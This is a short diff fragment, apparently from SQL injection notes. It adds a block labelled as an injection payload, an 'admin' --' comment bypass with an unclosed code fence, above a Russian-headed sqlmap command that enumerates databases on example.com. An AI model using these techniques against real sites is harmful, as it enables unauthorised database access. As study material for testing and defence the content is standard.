@@ -1,3 +1,10 @@
+> SQL Injection Payload:
+> ```sql
+> SELECT * FROM users WHERE username = 'admin' --';
+> `
+
+
+
 Определение базы данных:
 sqlmap -u "http://example.com/index.php?id=1" --dbs
 
